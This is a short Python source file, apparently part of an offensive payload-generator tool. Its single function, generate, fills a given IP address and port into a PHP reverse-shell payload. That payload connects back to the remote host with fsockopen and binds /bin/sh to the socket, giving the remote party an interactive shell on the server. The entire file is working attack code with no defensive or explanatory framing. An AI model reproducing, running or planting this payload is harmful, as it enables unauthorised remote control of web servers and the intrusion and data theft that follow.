# payloads/php.py
def generate(ip, port):
    return f"""<?php
$ip = '{ip}';
$port = {port};
$sock=fsockopen($ip,$port);
$proc=proc_open('/bin/sh', array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);
?>"""
